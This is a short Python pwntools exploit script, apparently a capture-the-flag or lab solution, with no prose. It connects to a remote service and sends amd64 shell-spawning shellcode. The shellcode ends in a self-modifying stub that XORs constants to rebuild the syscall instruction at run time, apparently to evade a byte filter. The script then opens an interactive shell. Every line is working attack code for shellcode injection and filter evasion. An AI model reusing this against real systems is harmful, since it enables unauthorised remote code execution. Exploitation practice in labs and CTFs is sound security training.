from pwn import *

# r = process("./lab")
r = remote("10.113.184.121", 10042)

context.arch = "amd64"

shellcode = shellcraft.sh()

syscall = """
    mov rcx, 0x040e
    xor rcx, 0x0101
    mov qword [rip-8], rcx
    """

payload = asm(shellcode)[:-2] + asm(syscall)
print(disasm(payload))

r.send(payload)

r.interactive()
